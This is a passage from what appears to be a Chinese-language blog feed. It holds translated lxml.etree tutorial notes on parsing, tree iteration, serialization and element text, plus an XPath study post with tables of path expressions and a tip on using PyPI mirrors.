里，你不得不使用 StringIO 模块里的 <strong>StringIO 类</strong> 来做到这一点。然而，在现实中这么做显然是给自己找麻烦，要么使用一个真实的文件，要么直接使用上述的几个函数来解析字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file_like_obj = BytesIO(<span class="string">b"&lt;html&gt;hello&lt;/html&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(file_like_obj)</span><br><span class="line">&lt;type <span class="string">'_io.BytesIO'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree = etree.parse(file_like_obj);;这里你可以指定第二个参数作为解析器</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(tree)</span><br><span class="line">&lt;type <span class="string">'lxml.etree._ElementTree'</span>&gt;;;注意这里是 ElementTree 对象了</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(tree)</span><br><span class="line"><span class="string">'&lt;html&gt;hello&lt;/html&gt;'</span></span><br></pre></td></tr></table></figure><p>再次注意：parse() 返回一个 ElementTree 对象而不是可以作为字符串解析器( tostring() )参数的 ELement 对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; etree.tostring(tree);;那这里为什么也可以解析 ElementTree 对象???</span><br><span class="line"><span class="string">'&lt;html&gt;hello&lt;/html&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = tree.getroot()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(root)</span><br><span class="line">&lt;type <span class="string">'lxml.etree._Element'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> root.tag</span><br><span class="line">html</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">'&lt;html&gt;hello&lt;/html&gt;'</span></span><br></pre></td></tr></table></figure><p><br>这种区别背后的原因是，parse() 从文件中返回一个完整的文档而字符串解析函数通常是被用来解析XML片段。<br><strong>parse()</strong> 函数支持一下任意类型的文件源：</p><ol><li>一个打开的文件对象（确保是以二进制模式打开的：”b”）</li><li>类文件对象（特点是：有一个 <code>.read( byte_count )</code>  方法每次调用都会返回一个字节串 [byte string] ）</li><li>一个文件名的字符串（相对路径，绝对路径）</li><li>HTTP 或 FTP 的 URL 地址字符串</li></ol><p>注意：传递一个文件名或者URL通常比传递一个打开的文件或者类文件对象要快得多。<br>然而，位于 libxml2 库中的 HTTP/FTP 客户端程序的实现是相当简单的，所以当涉及到像 HTTP 身份验证（这样复杂的任务）的话，需要使用专用的 URL 请求库，比如 <strong>urllib2</strong> 或者 <strong>requests</strong> 。这些库通常会提供一个类文件的对象以接收你从响应流中解析出来的结果。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文来源：&lt;code&gt;https://lxml.de/tutorial.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本文目录：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ElementTree 类&lt;/li&gt;
&lt;li&gt;从字符串和文件中解析&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XPath 学习（一）</title>
    <link href="https://pwn4justice.github.io/2019/07/07/XPath-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://pwn4justice.github.io/2019/07/07/XPath-学习（一）/</id>
    <published>2019-07-06T16:44:13.000Z</published>
    <updated>2019-07-06T16:55:24.613Z</updated>
    
    <content type="html"><![CDATA[<p>什么是 XPath？怎么使用的？什么是路径表达式、Step、路径、节点、元素、节点与元素的区别，等等…</p><a id="more"></a><h3 id="题外话：如何提升-pip-速度"><a href="#题外话：如何提升-pip-速度" class="headerlink" title="题外话：如何提升 pip 速度"></a>题外话：如何提升 pip 速度</h3><p><code>pip install [包名] -i [ftp站名地址] --trusted-host [ftp站点名]</code></p><p>站点地址有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">阿里云 http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class="line">豆瓣(douban) http://pypi.douban.com/simple/</span><br><span class="line">清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/</span><br><span class="line">中国科学技术大学 http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure><br><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>XPath，是XML Path Language，XML路径语言。用来搜寻XML（HTML）文档内容。</p><p>参考：<a href="https://www.w3.org/TR/xpath/" target="_blank" rel="noopener">xpath</a></p><br><h3 id="常用规则"><a href="#常用规则" class="headerlink" title="常用规则"></a>常用规则</h3><table><thead><tr><th align="center">表达式</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">html/body/…</td><td align="center">此节点的所有子节点</td></tr><tr><td align="center">/</td><td align="center">选择直接子节点</td></tr><tr><td align="center">//</td><td align="center">选取所有子、孙节点</td></tr><tr><td align="center">.</td><td align="center">选择当前节点</td></tr><tr><td align="center">..</td><td align="center">选择当前节点的父节点</td></tr><tr><td align="center">@</td><td align="center">选取属性</td></tr></tbody></table><p><strong>注：通常使用开头的 // 来选取所有符合要求的节点</strong></p><br><h3 id="XPath-术语"><a href="#XPath-术语" class="headerlink" title="XPath 术语"></a>XPath 术语</h3><ol><li>节点（Node）： 一般就是指元素（Element）</li><li>基本值（原子值 Atomic Value）</li><li>项目（Item）<ul><li>基本值或者节点</li></ul></li></ol><br><h3 id="节点之间的关系"><a href="#节点之间的关系" class="headerlink" title="节点之间的关系"></a>节点之间的关系</h3><ol><li>Parent</li><li>Children</li><li>Sibling</li><li>Ancestor<ul><li>父、父父等</li></ul></li><li>Descendant<ul><li>子、子子等</li></ul></li></ol><br><h3 id="XPath-有7种类型的节点"><a href="#XPath-有7种类型的节点" class="headerlink" title="XPath 有7种类型的节点"></a>XPath 有7种类型的节点</h3><ol><li>元素</li><li>属性</li><li>文本</li><li>命名空间</li><li>处理指令</li><li>注释</li><li>根节点（文档节点）</li></ol><br><h3 id="XPath-使用-lt-路径表达式-gt-在XML文档中选取节点"><a href="#XPath-使用-lt-路径表达式-gt-在XML文档中选取节点" class="headerlink" title="XPath 使用&lt;路径表达式&gt;在XML文档中选取节点"></a>XPath 使用&lt;路径表达式&gt;在XML文档中选取节点</h3><p><strong>节点是通过沿着路径或者 step 来选取的</strong>：</p><p><img src="./node_selecting.jpg" alt="My_understanding_of_NODE_selecting"></p><br><p><strong>路径表达式示例：</strong></p><p><strong>body</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选取 body 元素的子节点<br><strong>/html</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选取根元素 html，路径起始于 <code>/</code> ，则此路径代表某元素的绝对路径<br><strong>body/div</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选取属于 body 的子元素的所有 div 元素<br><strong>//img</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选取所有 img 子元素，而不管他们在文档的位置如何<br><strong>body//p</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选取属于 body 元素的后代的所有 p 元素，而不管它们位于 body 之下的什么位置<br><strong>//@href</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选取名为 href 的所有属性    <strong>???有待考证—是选取属性还是带该属性的节点???</strong></p><br><h3 id="谓语（Predicates）"><a href="#谓语（Predicates）" class="headerlink" title="谓语（Predicates）"></a>谓语（Predicates）</h3><p><strong>谓语</strong> 是用来查找某个特定的节点或者包含某个指定的值的节点，<strong>被嵌在方括号里</strong>。</p><p><br>一些带有谓语的路径表达式：</p><table><thead><tr><th align="center">路径表达式</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">/html/body/form/input[1]</td><td align="center">假定form表单（元素）里有多个input子元素，选取第一个input元素</td></tr><tr><td align="center">/html/body/form/input[last()]</td><td align="center">假设同上，选取最后一个 input 元素</td></tr><tr><td align="center">/html/body/form/intpu[last()-1]</td><td align="center">假设同上，选取倒数第二个 input 元素</td></tr><tr><td align="center">//body/form/input[position()&lt;3]</td><td align="center">假设同上，选取头两个 input 元素</td></tr><tr><td align="center">//p[@class]</td><td align="center">选取所有拥有 class 属性的 p 元素（节点）</td></tr><tr><td align="center">//p[@id=’some_id’]</td><td align="center">选取所有 id 属性值为 ‘some_id’ 的 p 元素</td></tr><tr><td align="center">/bookstore/book[price&gt;3.19]</td><td align="center">price 是元素，选取 bookstore 元素的所有 book 元素且其子元素 price 得满足&gt;3.19</td></tr><tr><td align="center">/bookstore/book[price&gt;1.08]/title</td><td align="center">选取 bookstore 元素的所有 book 元素（其子元素 price 得满足&gt;1.08）的所有 title 子元素</td></tr></tbody></table><br><h3 id="选取未知节点"><a href="#选取未知节点" class="headerlink" title="选取未知节点"></a>选取未知节点</h3><p>技巧：<strong>使用通配符</strong></p><p><code>*</code> ：     匹配任何元素（节点）</p><p><code>@*</code> ：    匹配任何属性节点</p><p><code>node()</code> ：匹配任何类型的节点（注意：元素只是7种节点的一种）</p><p><strong>示例：</strong></p><table><thead><tr><th align="center">路径表达式</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">/html/*</td><td align="center">选取 html 元素的所有子元素</td></tr><tr><td align="center">//*</td><td align="center">选取文档中的所有元素</td></tr><tr><td align="center">//div[@*]</td><td align="center">选取所有有属性的 div 元素</td></tr></tbody></table><br><h3 id="选取多个路径"><a href="#选取多个路径" class="headerlink" title="选取多个路径"></a>选取多个路径</h3><p><strong>相当于 or（或）</strong>：使用 <code>|</code> 运算符</p><p>举个栗子：</p><table><thead><tr><th align="center">路径表达式</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">//div/form | //p</td><td align="center">选取 div 元素的所有 form 子元素和文档中所有的 p 元素</td></tr><tr><td align="center">//script | //style</td><td align="center">选取文档中所有的 script 元素和 style 元素</td></tr></tbody></table><br>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;什么是 XPath？怎么使用的？什么是路径表达式、Step、路径、节点、元素、节点与元素的区别，等等…&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml etree tutorial - part three</title>
    <link href="https://pwn4justice.github.io/2019/07/06/lxml-etree-tutorial-part-three/"/>
    <id>https://pwn4justice.github.io/2019/07/06/lxml-etree-tutorial-part-three/</id>
    <published>2019-07-06T09:26:26.000Z</published>
    <updated>2019-07-08T14:43:19.161Z</updated>
    
    <content type="html"><![CDATA[<p>原文来源：<code>https://lxml.de/tutorial.html</code></p><p>本文内容：</p><ol><li>树的迭代</li><li>序列化</li></ol><a id="more"></a><h3 id="树的迭代（Tree-iteration）"><a href="#树的迭代（Tree-iteration）" class="headerlink" title="树的迭代（Tree iteration）"></a>树的迭代（Tree iteration）</h3><p>对于上面的问题，也就是当你想反复地遍历文档树并对其中元素们进行操作的时候，树迭代是一个方便的解决方案。元素对象（Elements）提供了一个树迭代器来做到这些。这个迭代器（ <strong>obj.iter()</strong> ）会以<em>文档顺序（document order）</em>产生元素对象，例如：<strong>如果你把树序列化成XML，它们的标签会按顺序出现</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.Element(<span class="string">"root"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.SubElement(root, <span class="string">"child"</span>).text = <span class="string">"child1"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.SubElement(root, <span class="string">"child"</span>).text = <span class="string">"child2"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.SubElement(root, <span class="string">"another"</span>).text = <span class="string">"child3"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root, pretty_print=<span class="literal">True</span>)</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;child&gt;child1&lt;/child&gt;</span><br><span class="line">  &lt;child&gt;child2&lt;/child&gt;</span><br><span class="line">  &lt;another&gt;child3&lt;/another&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter():</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> <span class="string">"%s - %s"</span> % (element.tag, element.text)</span><br><span class="line">...</span><br><span class="line">root - <span class="literal">None</span></span><br><span class="line">child - child1</span><br><span class="line">child - child2</span><br><span class="line">another - child3</span><br></pre></td></tr></table></figure><p><br>如果你只对单个标签感兴趣，你可以将标签名作为参数传递给 <em>iter()</em> 来进行过滤。从 lxml 3.0 开始，你可以向 <em>iter()</em> 传递多个标签名，以便在迭代过程中拦截多个标签。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter(<span class="string">"child"</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> <span class="string">"%s - %s"</span> % (element.tag, element.text)</span><br><span class="line">...</span><br><span class="line">child - child1</span><br><span class="line">child - child2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter(<span class="string">"child"</span>, <span class="string">"another"</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> <span class="string">"%s - %s"</span> % (element.tag, element.text)</span><br><span class="line">...</span><br><span class="line">child - child1</span><br><span class="line">child - child2</span><br><span class="line">another - child3</span><br></pre></td></tr></table></figure><p><br>默认来说，迭代会生成树中的所有节点，包括处理指令（ProcessInstruction），注释（Comment）和实体实例（Entity instances）。如果你只想保证元素对象（Element objects）被返回，可以传递 Element 工厂方法给标签参数：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root.append(etree.Entity(<span class="string">"#234"</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root.append(etree.Comment(<span class="string">"my comment here"</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter():</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> isinstance(element.tag, basestring): <span class="comment"># or 'str' in Python3</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">print</span> <span class="string">"%s - %s"</span> % (element.tag, element.text)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">print</span> <span class="string">"Special: %s - %s."</span> % (element, element.text)</span><br><span class="line">...</span><br><span class="line">root - <span class="literal">None</span></span><br><span class="line">child - child1</span><br><span class="line">child - child2</span><br><span class="line">another - child3</span><br><span class="line">Special: &amp;<span class="comment">#234; - &amp;#234;.</span></span><br><span class="line">Special: &lt;!--my comment here--&gt; - my comment here.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter(tag=etree.Element):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> <span class="string">"%s - %s"</span> % (element.tag, element.text)</span><br><span class="line">...</span><br><span class="line">root - <span class="literal">None</span></span><br><span class="line">child - child1</span><br><span class="line">child - child2</span><br><span class="line">another - child3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter(tag=etree.Comment):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> <span class="string">"%s - %s"</span> % (element, element.text)</span><br><span class="line">...</span><br><span class="line">&lt;!--my comment here--&gt; - my comment here</span><br></pre></td></tr></table></figure><p><br>注意，当传递通配符 <code>*</code> 给tag参数的时候，也会生成所有 Element 节点（即仅生成 Elements 对象）。<br>在lxml.etree库中，元素对象（Element）为树提供了更深层次的迭代器，这些迭代器可以不同的方向开始迭代，比如从孩子方向，从父母（甚至祖先）方向或从兄弟方向。</p><h3 id="序列化-（Serialization）"><a href="#序列化-（Serialization）" class="headerlink" title="序列化 （Serialization）"></a>序列化 （Serialization）</h3><p>通常使用 <strong>tostring()</strong> 函数返回一个字符串来进行序列化，或者使用 <strong>ElementTree.wirte()</strong> 方法写入一个文件，或一个类文件对象（file-like object），或一个URL（通过 FTP 的 PUT 或 HTTP 的 POST 等方式）。这两种方式可以接收一些相同的关键字参数，比如都可以用 <strong>pretty_print</strong> 来格式化输出，或者 <strong>encoding</strong> 来指定输出的编码格式而不是采用纯ASCII码的形式输出，当然还有 <strong>xml_declaration</strong> 等：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.XML(<span class="string">'&lt;root&gt;&lt;a&gt;&lt;b/&gt;&lt;/a&gt;&lt;/root&gt;'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">'&lt;root&gt;&lt;a&gt;&lt;b/&gt;&lt;/a&gt;&lt;/root&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root, pretty_print=<span class="literal">True</span>)</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;a&gt;</span><br><span class="line">    &lt;b/&gt;</span><br><span class="line">  &lt;/a&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root, encoding=<span class="string">'iso-8859-1'</span>)</span><br><span class="line">&lt;?xml version='1.0' encoding='iso-8859-1'?&gt;</span><br><span class="line">&lt;root&gt;&lt;a&gt;&lt;b/&gt;&lt;/a&gt;&lt;/root&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root, xml_declaration=<span class="literal">True</span>)</span><br><span class="line">&lt;?xml version='1.0' encoding='ASCII'?&gt;</span><br><span class="line">&lt;root&gt;&lt;a&gt;&lt;b/&gt;&lt;/a&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><br>注意：pretty_print 会在末尾加一条新行</p><p>在 lxml2.0 及之后的版本中（也是 ElementTree 1.3 之后），序列化函数不仅仅只可以序列化XML了，也可以序列化HTML或者通过使用 <strong>method</strong> 关键词参数来提取文本内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.XML(<span class="string">'&lt;html&gt;&lt;head/&gt;&lt;body&gt;&lt;p&gt;Hello&lt;br/&gt;World&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">'&lt;html&gt;&lt;head/&gt;&lt;body&gt;&lt;p&gt;Hello&lt;br/&gt;World&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root, method=<span class="string">'xml'</span>)</span><br><span class="line"><span class="string">'&lt;html&gt;&lt;head/&gt;&lt;body&gt;&lt;p&gt;Hello&lt;br/&gt;World&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root, method=<span class="string">'html'</span>)</span><br><span class="line"><span class="string">'&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Hello&lt;br&gt;World&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root, method=<span class="string">'html'</span>,pretty_print=<span class="literal">True</span>)</span><br><span class="line"><span class="string">'&lt;html&gt;\n&lt;head&gt;&lt;/head&gt;\n&lt;body&gt;&lt;p&gt;Hello&lt;br&gt;World&lt;/p&gt;&lt;/body&gt;\n&lt;/html&gt;\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root, method=<span class="string">'html'</span>,pretty_print=<span class="literal">True</span>)</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;p&gt;Hello&lt;br&gt;World&lt;/p&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root, method=<span class="string">'text'</span>)</span><br><span class="line"><span class="string">'HelloWorld'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(etree.tostring(root, method=<span class="string">'text'</span>))</span><br><span class="line">&lt;type <span class="string">'str'</span>&gt;</span><br></pre></td></tr></table></figure><p><br>至于对 XML 文档的序列化，默认对纯文本的编码是 ASCII：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>br = next(root.iter(<span class="string">'br'</span>))  <span class="comment"># get first result of iteration</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>br.tail = <span class="string">u'W\xf6rld'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root, method=<span class="string">'text'</span>)  <span class="comment"># doctest: +ELLIPSIS</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">UnicodeEncodeError: <span class="string">'ascii'</span> codec can<span class="string">'t encode character u'</span>\xf6<span class="string">' ...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; etree.tostring(root, method='</span>text<span class="string">', encoding="UTF-8")</span></span><br><span class="line"><span class="string">b'</span>HelloW\xc3\xb6rld<span class="string">'</span></span><br></pre></td></tr></table></figure><p><br>序列化为Python unicode字符串而不是字节字符串（byte string）会很方便。只需要传递”unicode”给 encoding 参数即可:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root, encoding=<span class="string">'unicode'</span>, method=<span class="string">'text'</span>)</span><br><span class="line"><span class="string">u'HelloW\xf6rld'</span></span><br></pre></td></tr></table></figure><p><br>W3C 里有一篇文章<a href="http://www.w3.org/International/tutorials/tutorial-char-enc/" target="_blank" rel="noopener">关于Unicode字符集和字符编码的文章</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文来源：&lt;code&gt;https://lxml.de/tutorial.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本文内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;树的迭代&lt;/li&gt;
&lt;li&gt;序列化&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml.etree tutorial - part two</title>
    <link href="https://pwn4justice.github.io/2019/07/02/lxml-etree-tutorial-part-two/"/>
    <id>https://pwn4justice.github.io/2019/07/02/lxml-etree-tutorial-part-two/</id>
    <published>2019-07-02T08:20:00.000Z</published>
    <updated>2019-07-08T14:43:34.928Z</updated>
    
    <content type="html"><![CDATA[<p>原文来源：<code>https://lxml.de/tutorial.html</code></p><p>本文内容：</p><ol><li>元素包含文本</li><li>使用 XPath 查找文本</li></ol><a id="more"></a><h2 id="元素（Elements）可以包含文本（TEXT）"><a href="#元素（Elements）可以包含文本（TEXT）" class="headerlink" title="元素（Elements）可以包含文本（TEXT）"></a>元素（Elements）可以包含文本（TEXT）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root = etree.Element(&quot;root&quot;)</span><br><span class="line">&gt;&gt;&gt; root.text = &quot;TEXT&quot;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(root.text)</span><br><span class="line">TEXT</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; etree.tostring(root)</span><br><span class="line">b&apos;&lt;root&gt;TEXT&lt;/root&gt;&apos;</span><br></pre></td></tr></table></figure><p>在许多XML文档（以数据为中心的文档）中，这里是唯一存在”文本”的地方了。一般文本会被包含在位于树层级的最底层的叶子标签中。</p><p>然而，如果XML被用于向（X）HTML这样的”标签文本文档”，那么”文本(TEXT)”可以在不同的标签之间出现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;Hello&lt;br/&gt;World&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里，<code>&lt;br/&gt;</code> 标签被文本包围了。这就是常说的 <em>文档型</em> 或者 <em>混合内容</em> 的XML。Element 类通过其 <strong>tail</strong> 属性来支持这种写法。tail 属性表示在一颗XML树中，紧跟在一个元素后，另一个不同元素前的文本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; html = etree.Element(&quot;html&quot;)</span><br><span class="line">&gt;&gt;&gt; body = etree.SubElement(html, &quot;body&quot;)</span><br><span class="line">&gt;&gt;&gt; body.text = &quot;TEXT&quot;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; etree.tostring(html)</span><br><span 